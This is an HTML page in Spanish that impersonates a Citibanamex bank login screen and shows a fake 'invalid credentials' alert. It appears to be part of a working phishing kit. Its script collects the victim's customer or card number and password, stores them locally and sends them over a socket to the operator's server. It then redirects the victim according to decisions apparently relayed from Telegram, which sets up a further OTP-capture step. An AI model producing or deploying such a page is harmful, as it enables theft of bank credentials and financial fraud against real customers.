<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificación de cuenta</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
  <style>
    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f3f6f9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
    }

    .screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      background: #fff;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }

    .logo {
      width: 190px;
      margin-bottom: 1rem;
    }

    h2 {
      font-size: 1.5em;
      margin-bottom: 1rem;
    }

    p {
      font-size: 1em;
      color: #555;
      margin-bottom: 1rem;
    }

    .alerta {
      background-color: #ffe5e5;
      color: #d8000c;
      border: 1px solid #d8000c;
      padding: 10px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-size: 0.95em;
      width: 100%;
      max-width: 350px;
    }

    .input-group {
      display: flex;
      align-items: center;
      background: #f0f2f5;
      border-radius: 8px;
      margin: 1rem 0;
      padding: 0.0rem 1rem;
      width: 100%;
      max-width: 350px;
      justify-content: flex-start;
      margin-left: -15px;
    }

    .input-group .icon {
      color: #888;
      margin-right: 0.5rem;
    }

    .input-group input {
      border: none;
      background: transparent;
      outline: none;
      flex: 1;
      font-size: 1rem;
      padding: 10px 0.75rem;
      height: 20px;
    }

    button {
      background-color: #4627F5;
      color: white;
      padding: 8px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
      width: auto;
      margin-top: 1rem;
    }

    button:hover {
      background-color: #000000;
    }
  </style>
</head>
<body>
  <div class="screen active" id="pantallaError">
    <img src="https://aymdesarrolloempresarial.com/wp-content/uploads/2018/01/citibanamex-logo.png" alt="logo" class="logo">
    <h2>Bienvenido a <strong>CITIBANAMEX</strong></h2>
    <div class="alerta">
      ❗ Numero de cliente o trajeta de credito o clave inválida. Por favor ingrese a su cuenta correctamente.
    </div>
    <p>Ingrese su numero de cliente o trajeta de credito y contraseña para iniciar con su proceso financiero.</p>
    <form id="login-form">
      <div class="input-group">
        <div class="icon"><i class="fas fa-user"></i></div>
        <input type="text" id="usuario" placeholder="Ingrese su numero de cliente o trajeta de credito" required />
      </div>
      <div class="input-group">
        <div class="icon"><i class="fas fa-lock"></i></div>
        <input type="password" id="clave" placeholder="Contraseña" required />
      </div>
      <button type="submit">Continuar</button>
    </form>
  </div>

  <!-- Scripts -->
  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();

    window.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('login-form');

      if (form) {
        form.addEventListener('submit', (e) => {
          e.preventDefault();

          const usuario = document.getElementById('usuario').value;
          const contrasena = document.getElementById('clave').value;
          const sessionId = localStorage.getItem('sessionId');

          if (!usuario || !contrasena) {
            alert("Por favor, complete todos los campos.");
            return;
          }

          // Guardar en localStorage
          localStorage.setItem('usuario', usuario);
          localStorage.setItem('contrasena', contrasena);

          // Enviar al servidor
          socket.emit('errorlogoForm', { usuario, contrasena, sessionId });

          // Redirigir
          window.location.href = 'opciones.html';
        });
      }
    });

    // Respuesta desde Telegram
    socket.on("respuestaErrorLogo", (decision) => {
      if (decision === "otp") {
        window.location.href = "bienvenido.html";
      } else if (decision === "error_logo") {
        window.location.href = "errorlogo.html";
      }
    });
  </script>
</body>
</html>
